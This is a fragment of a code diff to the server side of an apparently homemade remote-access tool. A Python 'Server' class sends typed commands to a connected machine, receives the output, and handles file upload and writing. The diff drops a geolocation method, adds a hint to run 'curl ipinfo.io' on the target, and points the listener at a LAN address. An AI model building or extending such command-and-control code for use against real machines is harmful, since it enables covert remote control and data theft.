@@ -34,11 +34,6 @@ class Server:
             exit()
         return self.reliable_receive()
     
-    def get_geo(self):
-        command = ""
-        self.reliable_send(command)
-        return self.reliable_receive()
-    
     def write_file(self, path, content):
         with open(path, "wb+") as file:
             file.write(content)
@@ -50,6 +45,7 @@ class Server:
         f.close()
     def run(self):
         while True:
+            print("To Check GEO LOCATION TRY: curl ipinfo.io")
             command = input(">>> ")
             command = command.split(" ")
             if command[0] == "upload":
@@ -64,5 +60,5 @@ class Server:
             except AttributeError:
                 print(result)
 
-skills = Server("localhost", 2463)
+skills = Server("192.168.1.228", 2463)
 skills.run()
